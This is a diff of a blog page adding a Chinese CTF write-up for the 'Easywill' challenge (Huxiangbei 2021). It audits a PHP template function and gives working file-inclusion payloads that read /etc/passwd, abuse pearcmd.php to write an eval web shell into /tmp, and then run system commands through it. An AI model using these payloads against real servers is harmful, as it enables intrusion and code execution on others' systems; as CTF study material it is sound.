@@ -10,7 +10,10 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="H3ng,"> 
-    
+    <meta name="description" content="Easywill网上下载源码丢，进seay审计代码：
+
+审计到Template.php
+public static function renderTo($viewfile, $vars = []) ,"> 
     <meta name="author" content="H3ng"> 
     <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -54,7 +57,32 @@
 
         </div>
         <div class="content markdown">
-            
+            <h1 id="Easywill"><a href="#Easywill" class="headerlink" title="Easywill"></a>Easywill</h1><p>网上下载源码丢，进seay审计代码：</p>
+<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118110602137.png" alt="image-20211118110602137"></p>
+<p>审计到Template.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">renderTo</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token constant">__MODULE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-'</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">.</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'jump.html'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-jump.html.php'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token constant">PATH_VIEWC</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$cfile</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$strs</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">,</span> <span class="token variable">$strs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$cfile</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>$cfile可控</p>
+<pre><code>?name=cfile&amp;value=/etc/passwd</code></pre>
+<pre><code>?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/.1.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+ </code></pre>
+<pre><code>GET:
+?name=cfile&amp;value=/tmp/.1.php
+POST:
+0=system('cat /f*')</code></pre>
+<h1 id="Pentest-in-Autumn"><a href="#Pentest-in-Autumn" class="headerlink" title="Pentest in Autumn"></a>Pentest in Autumn</h1><p>pom.xml里面有个shiro 1.5.0</p>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                 <source type="audio/mpeg" src="">
@@ -85,7 +113,7 @@
     </div>
     
         <div class='side'>
-				
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Easywill"><span class="toc-number">1.</span> <span class="toc-text">Easywill</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pentest-in-Autumn"><span class="toc-number">2.</span> <span class="toc-text">Pentest in Autumn</span></a></li></ol>	
         </div>
     
 </div>
